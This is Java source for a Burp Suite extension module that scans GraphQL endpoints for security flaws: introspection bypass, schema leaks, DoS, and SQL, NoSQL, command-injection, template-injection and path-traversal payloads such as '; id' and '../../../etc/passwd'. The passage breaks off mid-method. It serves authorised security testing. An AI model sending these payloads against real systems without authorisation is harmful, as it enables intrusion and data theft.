package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.google.gson.*;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 9: GraphQL Comprehensive Security Scanner
 *
 * Test categories:
 *   1. Introspection & Discovery (full query, bypass techniques, GraphiQL/Playground detection, field suggestion enum)
 *   2. Schema Analysis (sensitive fields, dangerous mutations, debug/internal types, unbounded lists, deprecated fields)
 *   3. Injection via GraphQL Arguments (SQLi, NoSQLi, CMDi, SSTI, path traversal, OOB/Collaborator)
 *   4. Authorization & IDOR Testing (ID enumeration, mutation authorization, nested object traversal)
 *   5. DoS & Resource Abuse (batch, alias, deep nesting, circular fragments, directive overloading, query cost)
 *   6. HTTP-Level Tests (GET method queries, content-type bypass, CSRF on mutations)
 *   7. Error & Info Disclosure (verbose errors, debug mode, framework fingerprinting)
 */
public class GraphqlTool implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    private final ConcurrentHashMap<String, Boolean> detectedEndpoints = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, JsonObject> schemas = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, List<String>> generatedQueries = new ConcurrentHashMap<>();
    private volatile String rawIntrospectionJson;

    private static final String MODULE_ID = "graphql-tool";

    // Full introspection query (4 levels deep)
    private static final String INTROSPECTION_QUERY = "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } defaultValue } type { kind name ofType { kind name ofType { kind name ofType { kind name } } } } isDeprecated deprecationReason } inputFields { name type { kind name ofType { kind name ofType { kind name } } } defaultValue } interfaces { kind name } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { kind name } } directives { name description locations args { name type { kind name ofType { kind name ofType { kind name } } } defaultValue } } } }";

    // Sensitive field/type name patterns
    private static final Pattern SENSITIVE_AUTH = Pattern.compile(
            "(?i)(password|token|secret|apikey|api_key|accesstoken|refreshtoken|sessiontoken|credential|auth_token)");
    private static final Pattern SENSITIVE_PII = Pattern.compile(
            "(?i)(ssn|socialsecurity|creditcard|cardnumber|cvv|dob|dateofbirth|social_security)");
    private static final Pattern DANGEROUS_MUTATION = Pattern.compile(
            "(?i)(delete|remove|drop|destroy|admin|purge|truncate|reset|wipe|execute|runquery)");
    private static final Pattern DEBUG_INTERNAL_TYPE = Pattern.compile(
            "(?i)^(Debug|Internal|Admin|Test|Dev|Staging)");
    private static final Pattern JWT_PATTERN = Pattern.compile(
            "eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+");

    // Common GraphQL endpoint paths
    private static final String[] GRAPHQL_PATHS = {
            "/graphql", "/graphql/v1", "/api/graphql", "/gql", "/query",
            "/v1/graphql", "/graphql/console", "/graphiql", "/api/gql",
            "/v2/graphql", "/graphql/api"
    };

    // GraphiQL/Playground/Explorer paths for discovery
    private static final String[] IDE_PATHS = {
            "/graphiql", "/playground", "/explorer", "/graphql/playground",
            "/graphql/graphiql", "/graphql/explorer", "/altair",
            "/graphql-playground", "/voyager"
    };

    // Framework fingerprint patterns: pattern -> framework name
    private static final String[][] FRAMEWORK_FINGERPRINTS = {
            {"\"extensions\":{\"tracing\"", "Apollo Server (tracing enabled)"},
            {"Apollo", "Apollo Server"},
            {"PersistedQueryNotFound", "Apollo Server (APQ enabled)"},
            {"hasura", "Hasura GraphQL Engine"},
            {"x-hasura", "Hasura GraphQL Engine"},
            {"graphql-java", "graphql-java"},
            {"GraphQLError", "graphql-js / Express GraphQL"},
            {"Unexpected token", "Express GraphQL / graphql-js"},
            {"absinthe", "Absinthe (Elixir)"},
            {"ariadne", "Ariadne (Python)"},
            {"strawberry", "Strawberry (Python)"},
            {"graphene", "Graphene (Python)"},
            {"Sangria", "Sangria (Scala)"},
            {"juniper", "Juniper (Rust)"},
            {"dgraph", "Dgraph"},
            {"\"code\":\"GRAPHQL_VALIDATION_FAILED\"", "Apollo Server"},
            {"\"code\":\"BAD_USER_INPUT\"", "Apollo Server"},
            {"WPGraphQL", "WPGraphQL (WordPress)"},
    };

    // SQL injection payloads for GraphQL arguments
    private static final String[][] SQLI_PAYLOADS = {
            {"' OR 1=1--", "Auth bypass OR 1=1"},
            {"' OR ''='", "Auth bypass tautology"},
            {"1' AND '1'='1", "Boolean-based AND true"},
            {"1' AND '1'='2", "Boolean-based AND false"},
            {"' UNION SELECT NULL--", "UNION single column"},
            {"' UNION SELECT NULL,NULL--", "UNION two columns"},
            {"'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based"},
            {"' AND SLEEP(5)--", "MySQL time-based"},
            {"'; SELECT pg_sleep(5)--", "PostgreSQL time-based"},
            {"' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL error-based"},
            {"' AND extractvalue(1,concat(0x7e,version()))--", "MySQL error-based extractvalue"},
            {"' AND updatexml(1,concat(0x7e,version()),1)--", "MySQL error-based updatexml"},
    };

    // NoSQL injection payloads
    private static final String[][] NOSQLI_PAYLOADS = {
            {"{\"$gt\":\"\"}", "MongoDB $gt operator"},
            {"{\"$ne\":\"\"}", "MongoDB $ne operator"},
            {"{\"$regex\":\".*\"}", "MongoDB $regex wildcard"},
            {"{\"$where\":\"1==1\"}", "MongoDB $where injection"},
            {"true, $where: '1 == 1'", "MongoDB $where inline"},
            {"{\"$gt\": 0}", "MongoDB numeric $gt"},
    };

    // OS command injection payloads
    private static final String[][] CMDI_PAYLOADS = {
            {"; id", "Semicolon id (Unix)"},
            {"| id", "Pipe id (Unix)"},
            {"$(id)", "Subshell id (Unix)"},
            {"`id`", "Backtick id (Unix)"},
            {"; sleep 5", "Semicolon sleep (Unix)"},
            {"& ping -n 5 127.0.0.1 &", "Ping delay (Windows)"},
            {"| whoami", "Pipe whoami"},
            {"; ls /", "Semicolon ls (Unix)"},
    };

    // SSTI payloads
    private static final String[][] SSTI_PAYLOADS = {
            {"{{7*7}}", "Jinja2/Twig 7*7", "49"},
            {"${7*7}", "Freemarker/EL 7*7", "49"},
            {"<%= 7*7 %>", "ERB 7*7", "49"},
            {"#{7*7}", "Ruby/Pug 7*7", "49"},
            {"{{constructor.constructor('return 7*7')()}}", "Handlebars/Pug", "49"},
            {"${{7*7}}", "Thymeleaf 7*7", "49"},
    };

    // Path traversal payloads
    private static final String[][] PATH_TRAVERSAL_PAYLOADS = {
            {"../../../etc/passwd", "root:", "Unix /etc/passwd (3 levels)"},
            {"....//....//....//etc/passwd", "root:", "Double-dot-slash bypass"},
            {"..%2f..%2f..%2fetc%2fpasswd", "root:", "URL-encoded traversal"},
            {"..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini"},
            {"/etc/passwd", "root:", "Absolute path"},
            {"....//....//....//windows/win.ini", "[fonts]", "Windows double-dot"},
    };

    // Introspection bypass payloads — alternate ways to get schema when full introspection is blocked
    private static final String[] INTROSPECTION_BYPASS_QUERIES = {
            // Individual __type queries
            "{ __type(name: \"Query\") { name fields { name type { name kind } } } }",
            "{ __type(name: \"Mutation\") { name fields { name type { name kind } } } }",
            // Whitespace/newline tricks
            "{\n  __schema\n  {\n    types {\n      name\n    }\n  }\n}",
            // GET request with query param (handled separately in method)
            // Abbreviated introspection
            "{ __schema { types { name kind } } }",
            // Using __typename on each known type
            "{ __schema { queryType { name } mutationType { name } } }",
            // Aliased introspection
            "{ a: __schema { types { name fields { name } } } }",
    };

    @Override
    public String getId() { return MODULE_ID; }

    @Override
    public String getName() { return "GraphQL Tool"; }

    @Override
    public String getDescription() {
        return "Comprehensive GraphQL security scanner: introspection, schema analysis, injection (SQLi/NoSQLi/CMDi/SSTI/LFI), "
                + "authorization/IDOR, DoS, HTTP-level tests, and error/info disclosure.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    // ==================== ENTRY POINT ====================

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String url = request.url();
        String path = extractPath(url);
        String host = request.httpService().host();

        // Detect by path
        boolean pathMatch = false;
        for (String gqlPath : GRAPHQL_PATHS) {
            if (path.equalsIgnoreCase(gqlPath) || path.toLowerCase().startsWith(gqlPath + "?")) {
                pathMatch = true;
                break;
            }
        }

        // Detect by request body
        String body = null;
        try { body = request.bodyToString(); } catch (Exception ignored) {}
        boolean bodyMatch = body != null && (body.contains("\"query\"") || body.contains("\"operationName\""));

        // Detect by response shape
        boolean responseMatch = false;
        if (requestResponse.response() != null) {
            try {
                String respBody = requestResponse.response().bodyToString();
                responseMatch = respBody != null && (respBody.contains("\"data\"") || respBody.contains("\"errors\""));
            } catch (Exception ignored) {}
        }

        if ((pathMatch || bodyMatch) && responseMatch) {
            String endpointKey = host + path;
            if (!dedup.markIfNew(MODULE_ID, host, path)) return Collections.emptyList();
            if (detectedEndpoints.putIfAbsent(endpointKey, Boolean.TRUE) == null) {
                api.logging().logToOutput("[GraphQL] Detected endpoint: " + url);

                try {
                    runFullScan(request, endpointKey, url);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    api.logging().logToOutput("[GraphQL] Scan interrupted for: " + url);
                } catch (Exception e) {
                    api.logging().logToError("[GraphQL] Scan error: " + e.getMessage());
                }
            }
        }

        return Collections.emptyList();
    }

    // ==================== MAIN SCAN ORCHESTRATOR ====================

    private void runFullScan(HttpRequest originalRequest, String endpointKey, String url) throws InterruptedException {
        String path = extractPath(url);
        JsonObject schema = null;

        // ---- 1. Introspection & Discovery ----
        schema = runIntrospection(originalRequest, endpointKey, url, path);

        checkInterrupted();

        // Try bypass techniques if introspection was blocked
        if (schema == null && config.getBool("graphql.introspection.bypass", true)) {
            schema = runIntrospectionBypass(originalRequest, endpointKey, url, path);
        }

        checkInterrupted();

        // GraphiQL/Playground/Explorer detection
        detectGraphQLIDEs(originalRequest, url);

        checkInterrupted();

        // Field suggestion enumeration
        testFieldSuggestion(originalRequest, path, url);

        checkInterrupted();

        // ---- 2. Schema Analysis ----
        if (schema != null) {
            analyzeSchema(schema, url);
            generateSampleQueries(schema, endpointKey);
        }

        checkInterrupted();

        // ---- 3-7: Security tests ----
        if (config.getBool("graphql.securityTests.enabled", true)) {

            // ---- 5. DoS & Resource Abuse ----
            if (config.getBool("graphql.dos.enabled", true)) {
                testBatchQuery(originalRequest, path, url);
                checkInterrupted();
                testDeepNesting(originalRequest, path, url);
                checkInterrupted();
                testAliasDos(originalRequest, path, url);
                checkInterrupted();
                testCircularFragments(originalRequest, path, url);
                checkInterrupted();
                testDirectiveOverloading(originalRequest, path, url);
                checkInterrupted();
            }

            // ---- 6. HTTP-Level Tests ----
            testGetMethodQuery(originalRequest, path, url);
            checkInterrupted();
            testContentTypeBypass(originalRequest, path, url);
            checkInterrupted();

            // ---- 7. Error & Info Disclosure ----
            testVerboseErrors(originalRequest, path, url);
            checkInterrupted();
            testDebugMode(originalRequest, path, url);
            checkInterrupted();
            testFrameworkFingerprint(originalRequest, path, url);
            checkInterrupted();

            // ---- 3. Injection via GraphQL Arguments (schema-driven) ----
            if (schema != null && config.getBool("graphql.injection.enabled", true)) {
                runInjectionTests(originalRequest, path, url, schema);
            }

            checkInterrupted();

            // ---- 4. Authorization & IDOR ----
            if (schema != null && config.getBool("graphql.authz.enabled", true)) {
                runAuthorizationTests(originalRequest, path, url, schema);
            }

            checkInterrupted();

            // CSRF on mutations
            if (schema != null) {
                testCsrfOnMutations(originalRequest, path, url, schema);
            }
        }
    }

    // ==================== 1. INTROSPECTION & DISCOVERY ====================

    private JsonObject runIntrospection(HttpRequest originalRequest, String endpointKey, String url, String path) throws InterruptedException {
        String introspectionBody = new Gson().toJson(Map.of("query", INTROSPECTION_QUERY));
        HttpRequest introspectionReq = buildGqlRequest(originalRequest, path, introspectionBody);

        HttpRequestResponse result = api.http().sendRequest(introspectionReq);
        perHostDelay();

        if (result == null || result.response() == null) return null;

        String responseBody = result.response().bodyToString();
        if (responseBody == null || responseBody.isBlank()) return null;

        try {
            JsonElement root = JsonParser.parseString(responseBody);
            if (!root.isJsonObject()) return null;
            JsonObject rootObj = root.getAsJsonObject();

            if (rootObj.has("data") && !rootObj.get("data").isJsonNull()
                    && rootObj.getAsJsonObject("data").has("__schema")) {
                JsonObject schema = rootObj.getAsJsonObject("data").getAsJsonObject("__schema");
                schemas.put(endpointKey, schema);
                rawIntrospectionJson = responseBody;

                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Introspection Enabled",
                                Severity.LOW, Confidence.CERTAIN)
                        .url(url)
                        .evidence("Full schema retrieved via introspection query")
                        .description("GraphQL introspection is enabled. This exposes the entire API schema "
                                + "including types, fields, and mutations. Should be disabled in production.")
                        .remediation("Disable introspection in production. In Apollo Server: "
                                + "new ApolloServer({ introspection: false })")
                        .requestResponse(result)
                        .build());

                return schema;

            } else if (rootObj.has("errors")) {
                api.logging().logToOutput("[GraphQL] Introspection blocked/error: "
                        + responseBody.substring(0, Math.min(200, responseBody.length())));
            }
        } catch (JsonSyntaxException e) {
            api.logging().logToError("[GraphQL] Introspection response not valid JSON: " + e.getMessage());
        }
        return null;
    }

    private JsonObject runIntrospectionBypass(HttpRequest originalRequest, String endpointKey, String url, String path) throws InterruptedException {
        api.logging().logToOutput("[GraphQL] Attempting introspection bypass techniques...");

        // POST-based bypass queries
        for (String bypassQuery : INTROSPECTION_BYPASS_QUERIES) {
            checkInterrupted();
            String body = new Gson().toJson(Map.of("query", bypassQuery));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result != null && result.response() != null) {
                String respBody = result.response().bodyToString();
                if (respBody != null && respBody.contains("__schema") && respBody.contains("\"name\"")
                        && !respBody.contains("\"errors\"")) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "GraphQL Introspection Bypass via Alternate Query",
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url)
                            .evidence("Bypass query: " + bypassQuery.substring(0, Math.min(100, bypassQuery.length())))
                            .description("Introspection was blocked for the full query but a simpler/alternate "
                                    + "query succeeded. The introspection block is incomplete.")
                            .requestResponse(result)
                            .build());

                    // Try to parse partial schema
                    try {
                        JsonObject rootObj = JsonParser.parseString(respBody).getAsJsonObject();
                        if (rootObj.has("data") && !rootObj.get("data").isJsonNull()) {
                            JsonObject data = rootObj.getAsJsonObject("data");
                            if (data.has("__schema")) {
                                JsonObject schema = data.getAsJsonObject("__schema");
                                schemas.put(endpointKey, schema);
                                return schema;
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }
        }

        // GET-based introspection bypass (some servers only block POST introspection)
        checkInterrupted();
        String encodedQuery = URLEncoder.encode(INTROSPECTION_QUERY, StandardCharsets.UTF_8);
        String getUrl = path + "?query=" + encodedQuery;
        HttpRequest getReq = HttpRequest.httpRequest(originalRequest.httpService(),
                "GET " + getUrl + " HTTP/1.1\r\n"
                        + "Host: " + originalRequest.httpService().host() + "\r\n"
                        + "Accept: application/json\r\n\r\n");

        HttpRequestResponse getResult = api.http().sendRequest(getReq);
        perHostDelay();

        if (getResult != null && getResult.response() != null) {
            String respBody = getResult.response().bodyToString();
            if (respBody != null && respBody.contains("__schema") && respBody.contains("\"types\"")) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL Introspection Bypass via GET Method",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url)
                        .evidence("Introspection succeeded via GET request while POST was blocked")
                        .description("Introspection is blocked on POST but allowed via GET. "
                                + "The server's introspection protection is method-dependent.")
                        .requestResponse(getResult)
                        .build());

                try {
                    JsonObject rootObj = JsonParser.parseString(respBody).getAsJsonObject();
                    if (rootObj.has("data") && !rootObj.get("data").isJsonNull()
                            && rootObj.getAsJsonObject("data").has("__schema")) {
                        JsonObject schema = rootObj.getAsJsonObject("data").getAsJsonObject("__schema");
                        schemas.put(endpointKey, schema);
                        return schema;
                    }
                } catch (Exception ignored) {}
            }
        }

        return null;
    }

    private void detectGraphQLIDEs(HttpRequest originalRequest, String url) throws InterruptedException {
        String host = originalRequest.httpService().host();
        for (String idePath : IDE_PATHS) {
            checkInterrupted();
            if (!dedup.markIfNew(MODULE_ID, host, "ide:" + idePath)) continue;

            HttpRequest req = HttpRequest.httpRequest(originalRequest.httpService(),
                    "GET " + idePath + " HTTP/1.1\r\n"
                            + "Host: " + host + "\r\n"
                            + "Accept: text/html,application/json\r\n\r\n");

            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result != null && result.response() != null) {
                int status = result.response().statusCode();
                String body = result.response().bodyToString();
                if (status == 200 && body != null
                        && (body.contains("GraphiQL") || body.contains("graphql-playground")
                        || body.contains("GraphQL Playground") || body.contains("graphql-explorer")
                        || body.contains("altair") || body.contains("voyager"))) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "GraphQL IDE Exposed: " + idePath,
                                    Severity.LOW, Confidence.CERTAIN)
                            .url(url.replace(extractPath(url), idePath))
                            .evidence("HTTP " + status + " with GraphQL IDE interface detected at " + idePath)
                            .description("A GraphQL development IDE (GraphiQL, Playground, Explorer, Altair, or Voyager) "
                                    + "is accessible. This provides an interactive query builder that aids schema exploration.")
                            .remediation("Disable or restrict access to GraphQL IDE interfaces in production.")
                            .requestResponse(result)
                            .build());
                }
            }
        }
    }

    private void testFieldSuggestion(HttpRequest originalRequest, String path, String url) throws InterruptedException {
        if (!dedup.markIfNew(MODULE_ID, extractPath(url), "fieldsugg")) return;

        // Test multiple misspelled fields to trigger suggestions
        String[] probes = {
                "{ usrs { id } }",
                "{ __typenameXXXX }",
                "{ uer { email } }",
                "{ prodcts { name } }",
        };

        Set<String> discoveredFields = new LinkedHashSet<>();

        for (String query : probes) {
            checkInterrupted();
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result != null && result.response() != null) {
                String respBody = result.response().bodyToString();
                if (respBody != null && (respBody.contains("Did you mean") || respBody.contains("did you mean"))) {
                    // Extract suggested field names
                    Pattern suggPattern = Pattern.compile("\"([A-Za-z_][A-Za-z0-9_]*)\"");
                    Matcher m = suggPattern.matcher(respBody);
                    while (m.find()) {
                        String suggested = m.group(1);
                        if (!suggested.equals("message") && !suggested.equals("errors")
                                && !suggested.equals("data") && !suggested.equals("extensions")) {
                            discoveredFields.add(suggested);
                        }
                    }
                }
            }
        }

        if (!discoveredFields.isEmpty()) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "GraphQL Field Suggestions Enabled",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence("Discovered fields via suggestions: " + String.join(", ", discoveredFields))
                    .description("Field suggestions are enabled. This leaks valid field names when "
                            + "misspelled queries are sent, enabling schema reconstruction without introspection. "
                            + "Discovered: " + discoveredFields.size() + " field(s).")
                    .remediation("Disable field suggestions in production. "
                            + "In Apollo: validationRules: [NoSchemaIntrospectionCustomRule]")
                    .build());
        }
    }

    // ==================== 2. SCHEMA ANALYSIS ====================

    private void analyzeSchema(JsonObject schema, String url) {
        if (!schema.has("types")) return;
        JsonArray types = schema.getAsJsonArray("types");

        for (JsonElement typeEl : types) {
            JsonObject type = typeEl.getAsJsonObject();
            String typeName = safeString(type, "name");
            if (typeName.startsWith("__")) continue;

            // Check for debug/internal types
            if (DEBUG_INTERNAL_TYPE.matcher(typeName).find()) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "Debug/Internal GraphQL Type: " + typeName,
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("Type: " + typeName)
                        .description("GraphQL type '" + typeName + "' appears to be a debug, internal, "
                                + "or admin type that may not be intended for public access.")
                        .build());
            }

            if (!type.has("fields") || type.get("fields").isJsonNull()) continue;
            JsonArray fields = type.getAsJsonArray("fields");

            for (JsonElement fieldEl : fields) {
                JsonObject field = fieldEl.getAsJsonObject();
                String fieldName = safeString(field, "name");
                String fullPath = typeName + "." + fieldName;

                // Check for sensitive auth fields
                if (SENSITIVE_AUTH.matcher(fieldName).find()) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "Sensitive Field Exposed: " + fullPath,
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url)
                            .evidence("Field: " + fullPath)
                            .description("Authentication/secret-related field '" + fieldName
                                    + "' exposed in GraphQL schema on type '" + typeName + "'.")
                            .build());
                }

                // Check for PII fields
                if (SENSITIVE_PII.matcher(fieldName).find()) {
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "PII Field Exposed: " + fullPath,
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url)
                            .evidence("Field: " + fullPath)
                            .description("PII field '" + fieldName + "' exposed in GraphQL schema.")
                            .build());
                }

                // Check for deprecated fields
                if (field.has("isDeprecated") && field.get("isDeprecated").getAsBoolean()) {
                    String reason = safeString(field, "deprecationReason");
                    findingsStore.addFinding(Finding.builder(MODULE_ID,
                                    "Deprecated Field Still Accessible: " + fullPath,
                                    Severity.INFO, Confidence.CERTAIN)
                            .url(url)
                            .evidence("Field: " + fullPath + (reason.isEmpty() ? "" : " | Reason: " + reason))
                            .description("Deprecated field '" + fieldName + "' is still accessible. "
                                    + "Deprecated fields may have weaker security controls or be unmaintained.")
                            .build());
                }

                // Check for unbounded list fields (no pagination arguments)
                JsonObject fieldType = field.getAsJsonObject("type");
                if (isListType(fieldType)) {
                    boolean hasPagination = false;
                    if (field.has("args") && !field.get("args").isJsonNull()) {
                        for (JsonElement argEl : field.getAsJsonArray("args")) {
                            String argName = safeString(argEl.getAsJsonObject(), "name").toLowerCase();
                            if (argName.equals("first") || argName.equals("last")
                                    || argName.equals("limit") || argName.equals("take")
                                    || argName.equals("pagesize") || argName.equals("per_page")) {
                                hasPagination = true;
                                break;
                            }
                        }
                    }
                    if (!hasPagination) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Unbounded List Field: " + fullPath,
                                        Severity.LOW, Confidence.TENTATIVE)
                                .url(url)
                                .evidence("Field: " + fullPath + " returns a LIST without pagination args (first/last/limit)")
                                .description("List field '" + fieldName + "' on type '" + typeName + "' has no "
                                        + "pagination arguments. This may allow fetching unlimited records, "
                                        + "leading to DoS or data exfiltration.")
                                .build());
                    }
                }
            }
        }

        // Check dangerous mutations
        if (schema.has("mutationType") && !schema.get("mutationType").isJsonNull()) {
            String mutationTypeName = schema.getAsJsonObject("mutationType").get("name").getAsString();
            for (JsonElement typeEl : types) {
                JsonObject type = typeEl.getAsJsonObject();
                if (mutationTypeName.equals(safeString(type, "name")) && type.has("fields") && !type.get("fields").isJsonNull()) {
                    for (JsonElement fieldEl : type.getAsJsonArray("fields")) {
                        String mutName = safeString(fieldEl.getAsJsonObject(), "name");
                        if (DANGEROUS_MUTATION.matcher(mutName).find()) {
                            findingsStore.addFinding(Finding.builder(MODULE_ID,
                                            "Dangerous Mutation: " + mutName,
                                            Severity.MEDIUM, Confidence.TENTATIVE)
                                    .url(url)
                                    .evidence("Mutation: " + mutName)
                                    .description("Potentially dangerous mutation '" + mutName + "' available. "
                                            + "Verify authorization controls prevent unauthorized use.")
                                    .build());
                        }
                    }
                }
            }
        }
    }

    // ==================== 3. INJECTION VIA GRAPHQL ARGUMENTS ====================

    private void runInjectionTests(HttpRequest originalRequest, String path, String url, JsonObject schema) throws InterruptedException {
        List<InjectableArg> args = extractInjectableArgs(schema);
        if (args.isEmpty()) return;

        api.logging().logToOutput("[GraphQL] Found " + args.size() + " injectable argument(s) for injection testing");

        for (InjectableArg arg : args) {
            checkInterrupted();
            String dedupKey = "inject:" + arg.parentType + "." + arg.fieldName + "." + arg.argName;
            if (!dedup.markIfNew(MODULE_ID, extractPath(url), dedupKey)) continue;

            // SQLi
            if (config.getBool("graphql.injection.sqli.enabled", true)) {
                testSqliOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }

            // NoSQLi
            if (config.getBool("graphql.injection.nosqli.enabled", true)) {
                testNosqliOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }

            // CMDi
            if (config.getBool("graphql.injection.cmdi.enabled", true)) {
                testCmdiOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }

            // SSTI
            if (config.getBool("graphql.injection.ssti.enabled", true)) {
                testSstiOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }

            // Path Traversal
            if (config.getBool("graphql.injection.enabled", true)) {
                testPathTraversalOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }

            // OOB via Collaborator (blind injection for SQLi, SSRF)
            if (config.getBool("graphql.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testOobOnArg(originalRequest, path, url, arg);
                checkInterrupted();
            }
        }
    }

    private void testSqliOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        // First, get baseline response
        String baselineQuery = buildQueryForArg(arg, "test123");
        String baselineBody = new Gson().toJson(Map.of("query", baselineQuery));
        HttpRequest baselineReq = buildGqlRequest(originalRequest, path, baselineBody);
        HttpRequestResponse baselineResult = api.http().sendRequest(baselineReq);
        perHostDelay();

        String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";
        long baselineTime = 0;

        for (String[] payloadInfo : SQLI_PAYLOADS) {
            checkInterrupted();
            String payload = payloadInfo[0];
            String technique = payloadInfo[1];

            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);

            long start = System.currentTimeMillis();
            HttpRequestResponse result = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            // Check for time-based (5+ second delay)
            if (technique.contains("time") && elapsed > 4500) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL SQL Injection (Time-Based) via " + arg.argName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | Response time: " + elapsed + "ms")
                        .description("Time-based SQL injection detected in GraphQL argument '" + arg.argName
                                + "' on field '" + arg.fieldName + "'. The server delayed ~"
                                + (elapsed / 1000) + " seconds.")
                        .requestResponse(result)
                        .build());
                return;
            }

            // Check for error-based (SQL error strings in response)
            if (containsSqlError(respBody) && !containsSqlError(baselineRespBody)) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL SQL Injection (Error-Based) via " + arg.argName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload
                                + " | SQL error in response")
                        .description("Error-based SQL injection detected in GraphQL argument '" + arg.argName
                                + "' on field '" + arg.fieldName + "'. SQL error messages appeared in response.")
                        .requestResponse(result)
                        .build());
                return;
            }
        }
    }

    private void testNosqliOnArg(HttpRequest originalRequest, String path, String url, InjectableArg arg) throws InterruptedException {
        String baselineQuery = buildQueryForArg(arg, "test123");
        String baselineBody = new Gson().toJson(Map.of("query", baselineQuery));
        HttpRequest baselineReq = buildGqlRequest(originalRequest, path, baselineBody);
        HttpRequestResponse baselineResult = api.http().sendRequest(baselineReq);
        perHostDelay();

        String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";
        int baselineLen = baselineRespBody.length();

        for (String[] payloadInfo : NOSQLI_PAYLOADS) {
            checkInterrupted();
            String payload = payloadInfo[0];
            String technique = payloadInfo[1];

            String query = buildQueryForArg(arg, payload);
            String body = new Gson().toJson(Map.of("query", query));
            HttpRequest req = buildGqlRequest(originalRequest, path, body);
            HttpRequestResponse result = api.http().sendRequest(req);
            perHostDelay();

            if (result == null || result.response() == null) continue;
            String respBody = result.response().bodyToString();
            if (respBody == null) continue;

            // Check for NoSQL errors or significant response length difference
            if (containsNosqlError(respBody) && !containsNosqlError(baselineRespBody)) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "GraphQL NoSQL Injection via " + arg.argName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url)
                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
                        .evidence("Technique: " + technique + " | Payload: " + payload)
                        .description("NoSQL injection detected in GraphQL argument '" + arg.argName
                                + "'. NoSQL error messages or operator processing detected.")
                        .requestResponse(result)
                        .build());
                return;
            }

            // Large response difference may indicate data exfil via operator injection
            if (respBody.length() > baselineLen * 3 && respBody.length() > 500
                    && result.response().statusCode() == 200) {
